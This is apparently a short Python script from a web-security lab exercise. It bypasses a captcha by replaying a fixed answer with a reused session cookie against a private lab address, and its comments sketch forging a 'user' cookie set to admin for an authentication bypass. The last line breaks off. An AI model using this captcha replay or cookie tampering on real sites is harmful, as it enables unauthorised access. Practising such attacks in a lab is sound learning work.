import requests
import hashlib


# <form action="submit" action="get">

#   <img src="captcha.png?t=1613656361.780905"/ > 
#   Answer: <input type="text" name="captcha"/>
#   <input type="submit" name="submit"/>
# </form>


# t = hashlib.md5("hacker".encode("utf-8"))
# print(f"{t.hexdigest()}")
# s = "6a21193069d08a3cea26a5fb91713f8ce5a51f0635e4499befe9ec9d7a785638"

# print(len(s))

data = {"captcha":"chat", "submit": "Submit Query"}
cookies = {"rack.session": "6a21193069d08a3cea26a5fb91713f8ce5a51f0635e4499befe9ec9d7a785638"}

r = requests.get('http://10.0.1.11/captcha/example4/submit?', params=data, cookies=cookies)

print(r.url)
print(r.content)  

# cookies['user'] = admin
# print(f"{cookies['user']}")
# r = requests.get('http://10.0.1.11/authentication/example4


